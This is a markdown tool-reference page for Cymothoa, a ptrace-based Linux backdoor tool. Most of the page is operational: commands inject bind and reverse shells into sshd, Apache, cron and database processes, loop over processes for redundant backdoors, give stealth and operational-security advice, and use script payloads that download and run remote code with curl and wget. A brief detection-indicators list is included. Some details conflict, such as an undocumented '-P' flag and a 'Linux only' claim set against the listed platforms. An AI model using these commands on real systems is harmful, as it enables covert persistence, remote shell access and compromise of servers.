---
title: "Cymothoa"
slug: "cymothoa"
version: "1 (beta)"
category: "Persistence"
author: "codwizard (codwizard@gmail.com) and crossbower (crossbower@gmail.com)"
license: "GPL"
repository: "https://sourceforge.net/projects/cymothoa/"
kali_page: "https://www.kali.org/tools/cymothoa/"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
description: "Stealth backdooring tool that injects shellcode into running processes using ptrace on Linux"
platforms:
  - "Linux"
  - "macOS"
  - "*BSD"
tags:
  - "process-injection"
  - "shellcode-injection"
  - "ptrace"
  - "backdoor"
  - "persistence"
  - "stealth"
  - "runtime-injection"
---

# Cymothoa

Cymothoa is a stealth backdoor tool that injects shellcode into running processes on Linux and *nix systems. It uses the `ptrace` library to manipulate processes and infect them at runtime, making the backdoor part of an existing legitimate process rather than a new file on disk.

Named after *Cymothoa exigua*, a parasitic crustacean that replaces a fish's tongue — the tool replaces a process's functionality with its own payload while the host continues running.

## Overview

Cymothoa operates by attaching to a running process via `ptrace`, writing shellcode into the process's memory space, and redirecting execution to the injected code. The original process continues to function normally while the backdoor executes within its context.

**Core Capabilities:**
- Inject shellcode into any running process (requires `ptrace` access)
- Thread injection for stealth on modern Linux
- In-process scheduler simulation (alarm/setitimer) — no separate thread needed
- Persistent memory regions for payload state
- 15 built-in shellcode payloads
- Custom script execution via shellcode
- Fork-based process hiding

**Key Innovation:** Cymothoa simulates a scheduler inside the host process, allowing shellcodes to run without independent threads or processes. This significantly improves stealth on modern systems.

## Installation

```bash
sudo apt update && sudo apt install -y cymothoa
```

**Explanation:** Installs Cymothoa from Kali repositories. The package includes three binaries: `cymothoa`, `bgrep` (binary grep), and `udp_server`.

### Manual Installation

```bash
git clone https://github.com/ernw/cymothoa.git
cd cymothoa
make
```

### SourceForge

```bash
wget https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta.tar.bz2
tar xjf cymothoa-1-beta.tar.bz2
cd cymothoa-src
make
```

## Dependencies

- **libc6**: Standard C library (provides `ptrace`)
- **Linux kernel**: Requires `ptrace` support (available on nearly all *nix systems)

No additional dependencies required. The tool is written in C and compiles against standard system libraries.

## Architecture

Cymothoa consists of three components:

1. **cymothoa**: Main injection tool. Attaches to target process, identifies memory regions, injects shellcode, and optionally modifies execution flow.

2. **bgrep**: Binary grep utility. Searches for hex patterns in binary files. Useful for finding shellcode stubs and memory patterns.

3. **udp_server**: Companion UDP server for payloads that communicate via UDP (payloads #4, #14).

### Injection Mechanism

The tool uses `ptrace(PTRACE_ATTACH)` to gain control of the target process, then:
1. Identifies suitable memory regions via `/proc/<pid>/maps`
2. Injects shellcode into an executable region (`r-xp`)
3. Stores persistent data in a writable region (`rw-p`)
4. Modifies the instruction pointer to redirect execution

## Usage

### List Available Shellcodes

```bash
cymothoa -S
```

**Explanation:** Displays all built-in shellcode payloads with their numbers and descriptions.

### Bind Shell Injection

```bash
cymothoa -p <target_pid> -s 0 -y 4444
```

**Explanation:** Injects a bind shell (payload #0) into the target process, listening on TCP port 4444. The shell is accessible via `nc 192.168.1.200 4444`.

### Reverse Shell Injection

```bash
cymothoa -p <target_pid> -s 3 -x 192.168.1.200 -y 4444
```

**Explanation:** Injects a reverse shell (payload #3) connecting back to `192.168.1.200:4444`.

### Password-Protected Bind Shell

```bash
cymothoa -p <target_pid> -s 2 -y 4444 -o "password"
```

**Explanation:** Injects a bind shell with password authentication (payload #2). Requires `-z` for the 4-byte username and `-o` for the 8-byte password.

### Thread-Based Injection

```bash
cymothoa -p <target_pid> -s 0 -y 4444 -F -b
```

**Explanation:** Injects shellcode as a new thread (`-b`) without forking the parent (`-F`). More stealthy than fork-based injection on modern Linux.

### Fork-Based Injection

```bash
cymothoa -p <target_pid> -s 0 -y 4444 -f
```

**Explanation:** Forks the parent process before injecting. The backdoor runs in a child process, providing some isolation.

### Scheduled Shellcode (Alarm)

```bash
cymothoa -p <target_pid> -s 13 -y 4444 -j 30
```

**Explanation:** Injects a scheduled backdoor (payload #13) using `alarm()`. The bind shell activates every 30 seconds via fork-on-accept.

### Scheduled Shellcode (Setitimer)

```bash
cymothoa -p <target_pid> -s 14 -x 192.168.1.200 -y 4444 -k 5000000
```

**Explanation:** Injects a setitimer-based payload (payload #14) that sends data via UDP every 5000000 microseconds (5 seconds).

### Custom Memory Region Targeting

```bash
cymothoa -p <target_pid> -s 0 -y 4444 \
  -l "/lib/libc.so.6" -m "/lib/ld-linux.so.2"
```

**Explanation:** Specifies custom memory regions for shellcode injection (`-l` for executable region) and persistent memory (`-m` for writable region). Override defaults when the target process has unusual memory layouts.

### Script Execution

```bash
cymothoa -p <target_pid> -s 5 -c "#!/bin/sh\ncurl http://192.168.1.200/payload.sh | sh; exit 0"
```

**Explanation:** Injects payload #5 (script execution) with inline script code. Creates a temp file and executes the provided script.

### In-Process Scheduler (No Thread)

```bash
cymothoa -p <target_pid> -s 11 -y 4444
```

**Explanation:** Uses payload #11 (POC alarm-scheduled shellcode). Runs entirely within the host process without creating threads or child processes.

### UDP Server Setup

```bash
udp_server 9999
```

**Explanation:** Starts the companion UDP server on port 9999 for payloads that require UDP communication (payloads #4, #14).

## Payload Reference

| # | Type | Description | Flags |
|---|------|-------------|-------|
| 0 | Bind | `/bin/sh` bind shell | -y (port) |
| 1 | Bind | `/bin/sh` bind + fork() | -y (port) |
| 2 | Bind | Bind shell + password auth | -y (port), -o (pass) |
| 3 | Reverse | `/bin/sh` connect back | -x (IP), -y (port) |
| 4 | Proxy | TCP socket proxy | -x, -y, -r |
| 5 | Script | Script execution | -c (script) |
| 6 | HTTP | Fork HTTP server on 8800 | None |
| 7 | Serial | Serial port busybox binding | None |
| 8 | Fun | Fork bomb | None |
| 9 | Fun | Open CD-ROM loop | None |
| 10 | Audio | Plays audio via /dev/dsp | None |
| 11 | Scheduled | POC alarm() scheduled code | -j (seconds) |
| 12 | Scheduled | POC setitimer() scheduled code | -k (microseconds) |
| 13 | Scheduled | alarm() backdoor (bind+fork) | -j, -y |
| 14 | Scheduled | setitimer() tail follow (UDP) | -k, -x, -y |

## Injection Options

| Flag | Purpose | Default |
|------|---------|---------|
| `-p PID` | Target process PID | Required |
| `-s NUM` | Shellcode number | Required |
| `-l REGION` | Executable memory region | /lib/ld |
| `-m REGION` | Writable persistent memory | /lib/ld |
| `-f` | Fork parent process | Off |
| `-F` | Don't fork parent process | On |
| `-b` | Create payload thread | Off |
| `-B` | Don't create payload thread | On |
| `-w` | Pass persistent memory address | Off |
| `-W` | Don't pass persistent memory | On |
| `-a` | Use alarm scheduler | Off |
| `-A` | Don't use alarm scheduler | On |
| `-t` | Use setitimer scheduler | Off |
| `-T` | Don't use setitimer scheduler | On |

## Payload Arguments

| Flag | Purpose |
|------|---------|
| `-x IP` | IP address for connect-back or proxy |
| `-y PORT` | Primary port number |
| `-r PORT` | Secondary port (proxy payloads) |
| `-z USER` | 4-byte username for auth |
| `-o PASS` | 8-byte password for auth |
| `-c SCRIPT` | Inline script code |
| `-j SECONDS` | Timer interval (seconds) |
| `-k MICROSECONDS` | Timer interval (microseconds) |

## Limitations

- **Linux only**: Requires `ptrace` support (Linux, *BSD). Not available on systems with `ptrace` restrictions (e.g., `Yama` security module).
- **Root required**: `ptrace` access to other processes requires root or `CAP_SYS_PTRACE`.
- **Process stability**: Injecting into critical processes may cause crashes. Test on non-production systems first.
- **Memory region selection**: Incorrect region choices can cause segfaults. Use `/proc/<pid>/maps` to identify suitable regions.
- **Single architecture**: Shellcodes are architecture-specific (x86/x64).
- **No persistence across reboot**: Injection is runtime-only. The backdoor is lost when the process terminates.
- **ptrace restrictions**: Modern kernels may restrict `ptrace` to parent processes. Disable Yama or use `kernel.yama.ptrace_scope=0`.

## Detection Indicators

- `/proc/<pid>/maps` shows unexpected memory regions
- Process memory size increases after injection
- Unusual network connections from legitimate processes
- `ptrace` system calls in audit logs
- Modified instruction pointer in process registers
- Unexpected threads in process

## MITRE ATT&CK Mapping

- **T1055** - Process Injection
- **T1055.003** - Thread Execution Hijacking
- **T1554** - Compromise Client Software Binary
- **T1027** - Obfuscated Files or Information

## Practical Scenarios

### Post-Exploitation Persistence
```bash
# On compromised target, find a stable process
ps aux | grep sshd
# Inject bind shell into sshd process
cymothoa -p $(pgrep sshd) -s 0 -y 4444
# Access backdoor
nc 192.168.1.200 4444
```

### Stealthy Reverse Shell
```bash
# Find a long-running process
TARGET_PID=$(pgrep -f "apache2|nginx|sshd" | head -1)
# Inject reverse shell
cymothoa -p $TARGET_PID -s 3 -x 10.10.14.5 -P 443 -F -b
# On attacker: nc -nlvp 443
```

### Scheduled Beacon
```bash
# Inject alarm-scheduled backdoor
cymothoa -p $(pgrep cron) -s 13 -y 4444 -j 60
# Backdoor activates every 60 seconds, fork on accept
```

### HTTP Server Persistence
```bash
# Inject HTTP server into a background process
cymothoa -p $(pgrep -f "rsyslogd") -s 6
# Access HTTP server at 192.168.1.200:8800
```

### Custom Script Delivery
```bash
# Inject script execution payload
cymothoa -p $(pgrep -f "xinetd") -s 5 \
  -c "#!/bin/sh\nwget http://192.168.1.200/update -O /tmp/update.sh\nchmod +x /tmp/update.sh\n/tmp/update.sh\nexit 0"
```

## Companion Utilities

### bgrep — Binary Pattern Search

```bash
bgrep "\x90\x90\x90\x90" /usr/bin/target
```

**Explanation:** Searches for NOP sled patterns in a binary. Useful for identifying injection points.

```bash
bgrep "4889e5" /usr/bin/target
```

**Explanation:** Searches for hex-encoded patterns (no `0x` prefix or `\x` notation).

### udp_server

```bash
udp_server 9999
```

**Explanation:** Companion UDP listener for payloads that require UDP communication.

## How ptrace Injection Works

Cymothoa exploits the Linux `ptrace` system call, which allows one process to control another. The injection sequence:

1. **Attach**: `ptrace(PTRACE_ATTACH, target_pid)` — Stops the target process and gains control
2. **Read State**: `ptrace(PTRACE_GETREGS)` — Save current register state
3. **Identify Memory**: Parse `/proc/<pid>/maps` — Find executable (`r-xp`) and writable (`rw-p`) regions
4. **Inject Code**: `ptrace(PTRACE_POKETEXT)` — Write shellcode byte-by-byte into executable region
5. **Write Data**: `ptrace(PTRACE_POKEDATA)` — Write persistent data into writable region
6. **Modify Execution**: `ptrace(PTRACE_SETREGS)` — Redirect instruction pointer (`RIP`/`EIP`) to shellcode
7. **Resume**: `ptrace(PTRACE_DETACH)` — Release control, target continues with injected code

### Memory Layout of Injected Process

```
Target Process Memory (Before Injection):
┌──────────────────────┐ High Address
│    Stack             │ (rw-p)
├──────────────────────┤
│    ...               │
├──────────────────────┤
│    /lib/ld.so        │ (r-xp) ← Shellcode target
├──────────────────────┤
│    libc.so           │ (r-xp)
├──────────────────────┤
│    ...               │
├──────────────────────┤
│    Heap              │ (rw-p) ← Persistent data
└──────────────────────┘ Low Address

After Injection:
┌──────────────────────┐ High Address
│    Stack             │
├──────────────────────┤
│    ...               │
├──────────────────────┤
│    /lib/ld.so        │ (r-xp)
│    [SHELLCODE HERE]  │ ← Injected payload
├──────────────────────┤
│    libc.so           │ (r-xp)
├──────────────────────┤
│    ...               │
├──────────────────────┤
│    Heap              │ (rw-p)
│    [PERSISTENT DATA] │ ← Injected state
└──────────────────────┘
```

## Memory Region Selection

### Finding Injection Targets

```bash
# View target process memory layout
cat /proc/<pid>/maps
```

**Explanation:** Shows all memory-mapped regions. Look for:
- `r-xp` regions for shellcode (executable)
- `rw-p` regions for persistent data (writable)

### Typical Region Patterns

| Region | Permissions | Usage |
|--------|-------------|-------|
| `/lib/ld.so` | `r-xp` | Shellcode injection (default `-l`) |
| `/lib/ld.so` | `rw-p` | Persistent data (default `-m`) |
| `/lib/libc.so` | `r-xp` | Alternative shellcode target |
| `[heap]` | `rw-p` | Writable data |
| `[stack]` | `rwxp` | Rare, may be disabled |

### Custom Region Selection

```bash
# Use specific regions
cymothoa -p <pid> -s 0 -y 4444 \
  -l "/usr/lib/x86_64-linux-gnu/libc.so.6" \
  -m "[heap]"
```

**Explanation:** Override default regions when the target process has unusual memory mappings. Verify with `/proc/<pid>/maps` first.

## Stealth Techniques

### Thread Injection

Thread injection is stealthier than forking on modern Linux:

```bash
# Thread-based (stealthy)
cymothoa -p <pid> -s 0 -y 4444 -F -b

# Fork-based (less stealthy, more isolated)
cymothoa -p <pid> -s 0 -y 4444 -f
```

**Thread vs Fork:**
- **Thread**: Runs within the target process's address space. No new PID. Harder to detect.
- **Fork**: Creates a child process. New PID visible in `ps`. Easier to isolate but more detectable.

### In-Process Scheduling

The most stealthy option — no threads, no child processes:

```bash
# Alarm-based scheduler
cymothoa -p <pid> -s 13 -y 4444 -j 60

# Setitimer-based scheduler
cymothoa -p <pid> -s 14 -x 192.168.1.200 -y 4444 -k 10000000
```

**Explanation:** These payloads simulate a scheduler inside the host process using `alarm()` or `setitimer()` signals. The shellcode activates periodically without creating threads or processes.

### Persistent Memory

Some shellcodes need to store state between invocations:

```bash
# Enable persistent memory
cymothoa -p <pid> -s 13 -y 4444 -j 60 -w

# Disable persistent memory (default)
cymothoa -p <pid> -s 13 -y 4444 -j 60 -W
```

**Explanation:** The `-w` flag passes the persistent memory address to the shellcode, allowing it to store data between executions (e.g., connection state, authentication tokens).

## Procfs Analysis

### Inspecting Target Processes

```bash
# Find long-running processes
ps -eo pid,ppid,user,comm,%mem,%cpu --sort=-%cpu | head -20

# Check process memory
cat /proc/<pid>/maps | grep -E "r-xp|rw-p"

# View process status
cat /proc/<pid>/status | grep -E "Name|State|Pid|PPid|Uid|Gid"

# Check open file descriptors
ls -la /proc/<pid>/fd

# View network connections
cat /proc/<pid>/net/tcp
```

**Explanation:** Pre-injection reconnaissance to identify suitable target processes and verify memory layout.

### Post-Injection Verification

```bash
# Check if injection succeeded
cat /proc/<pid>/maps | grep -c "r-xp"

# Monitor process memory changes
cat /proc/<pid>/status | grep VmRSS

# Check for new threads
ls /proc/<pid>/task/

# Monitor network connections
ss -tlnp | grep <pid>
```

## Advanced Scenarios

### Injecting into Apache

```bash
# Find Apache worker process
APACHE_PID=$(pgrep -f "apache2 -k" | head -1)

# Inject reverse shell
cymothoa -p $APACHE_PID -s 3 -x 192.168.1.200 -y 4444 -F -b

# On attacker
nc -nlvp 4444
```

**Explanation:** Apache worker processes are long-running and trusted, making them ideal injection targets.

### Injecting into SSH Daemon

```bash
# Find sshd process (must be root)
SSHD_PID=$(pgrep -o sshd)

# Inject bind shell
cymothoa -p $SSHD_PID -s 0 -y 4444

# Access from anywhere
nc 192.168.1.200 4444
```

**Explanation:** SSH daemon processes run as root with high privilege and network access.

### Injecting into Cron

```bash
# Inject scheduled backdoor into cron
cymothoa -p $(pgrep cron) -s 13 -y 4444 -j 300

# Cron will trigger the shellcode every 5 minutes
```

**Explanation:** Cron is an ideal target because it runs persistently and triggers periodically.

### Injecting into Database Server

```bash
# PostgreSQL injection
cymothoa -p $(pgrep -f postgres) -s 0 -y 4444

# MySQL injection
cymothoa -p $(pgrep -f mysqld) -s 3 -x 192.168.1.200 -y 4444 -F -b
```

**Explanation:** Database servers have high privileges and network access, making them valuable persistence targets.

### Chain Injection

```bash
# Inject into multiple processes for redundancy
for pid in $(pgrep -f "apache2|sshd|cron"); do
    cymothoa -p $pid -s 3 -x 192.168.1.200 -y 4444 -F -b
done
```

**Explanation:** Injecting into multiple processes provides redundancy — if one is killed, others remain.

## Operational Security

### Hiding Injection

```bash
# After injection, modify /proc/<pid>/maps visibility
# (requires kernel module or advanced technique)

# Use legitimate process names
# Inject into processes with common names (sshd, apache2, cron)
```

### Cleanup

```bash
# Cymothoa injection is runtime-only
# Killing the target process removes the backdoor
kill <pid>

# Verify removal
cat /proc/<pid>/maps 2>/dev/null || echo "Process terminated"
```

## Related Tools

- **process-inject**: Modern process injection framework for Linux
- **libprocesshider**: Library for hiding processes
- **memfd_create**: Anonymous file descriptor-based injection (alternative approach)
- **LD_PRELOAD**: Shared library injection (different technique)
- **msfvenom**: Generate shellcodes for use with Cymothoa
- **injectso**: Shared library injection via ptrace
- **libprocesshider**: Hide process from /proc
- **hidepid**: Kernel module for process hiding

## Resources

- [SourceForge Project](https://sourceforge.net/projects/cymothoa/)
- [Kali Linux Package](https://www.kali.org/tools/cymothoa/)
- [ES-Malaria Project](http://www.0x4553.org/)
- [crossbower.net](https://crossbowerbt.github.io/)
- [MITRE ATT&CK TA0003](https://attack.mitre.org/tactics/TA0003/)
